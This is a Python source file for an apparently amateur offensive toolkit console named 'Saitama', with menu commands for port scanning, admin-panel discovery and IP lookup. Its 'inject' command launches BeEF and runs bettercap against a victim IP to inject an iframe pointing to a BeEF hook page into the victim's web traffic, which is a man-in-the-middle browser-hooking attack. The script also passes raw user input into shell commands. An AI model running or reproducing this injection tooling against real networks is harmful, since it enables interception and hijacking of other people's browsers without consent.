#!/usr/bin/env python

from banners import printBanners
import subprocess
import sys

#Color lib.
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

subprocess.call('clear', shell=True)

#banner:
def banner():
	banner = printBanners()
	subprocess.call('clear', shell = True)
	print banner

#exit:
exit_message = bcolors.BOLD + bcolors.FAIL + "...OK" + bcolors.ENDC

#help screen
helpmsg = bcolors.BOLD + bcolors.WARNING + """
	credits:	Shows the credits
	clear  :	Clears the screen
	banner :	Draws a new banner
       portscan:	Scans a target for open ports
	webmin :	Searchs for an admin panel on a website
	inject : 	Injects a target with a beef site(Requires beef-xss and bettercap)
	getip  :	Shows the IP of a website
	exit   :	Exiting...
	help   :	Shows this message
""" + bcolors.ENDC
#input screen
def input():
	while True:
		#INPUT:
		input = raw_input(bcolors.OKBLUE + bcolors.BOLD + "Saitama > " + bcolors.ENDC)
		if input == "credits":
			print(bcolors.OKGREEN + "Made by KainAlive" + bcolors.ENDC)
		elif input == "exit":
			sys.exit(exit_message)
		elif input == "clear":
			subprocess.call('clear', shell = True)
		elif input == "banner":
			banner()
		elif input == "portscan":
			subprocess.call('xterm -e python modules/portscan.py -T Portscan by KainAlive', shell = True)
		elif input == "webmin":
			subprocess.call('xterm -e python modules/webmin.py -T Webmin by KainAlive', shell = True)
		elif input == "inject":
				ip = raw_input(bcolors.WARNING + bcolors.BOLD + "Please input your local IP: " + bcolors.ENDC)
				target = raw_input(bcolors.WARNING + bcolors.BOLD + "Pleas input target IP: " + bcolors.ENDC)
				try:
					subprocess.call('xterm -e beef-xss', shell = True)
					try:
						 subprocess.call('xterm -e bettercap -T ' + target  + ' --proxy-module injecthtml --html-iframe-url http:// ' + ip + ':3000/demos/basic.html', shell = True)
					except Exception:
						print bcolors.FAIL + bcolors.BOLD + "Please install bettercap to continue"
						sys.exit()
				except Exception:
					print bcolors.FAIL +  bcolors.BOLD + "Pleas install beef-xss to continue"
					sys.exit()
		elif input == "getip":
			subprocess.call('python modules/getIP.py' , shell = True)
		elif input == "help":
			print helpmsg
		else:
			print bcolors.FAIL + bcolors.BOLD + "Error, no kown command, try help for more information" + bcolors.ENDC

		#NOT WORKING YET, BUT WHY...
		#Exeption:
		#except KeyboardInterrupt:
		#	sys.exit("\n" + exit_message)
		#except Exception:
		#	print bcolors.BOLD + bcolors.FAIL + bcolors.UNDERLINE + "There was an unexpected error" + bcolors.ENDC
		#	traceback.print_exc(file=sys.stdout)
		#	sys.exit(0)


banner()
input()
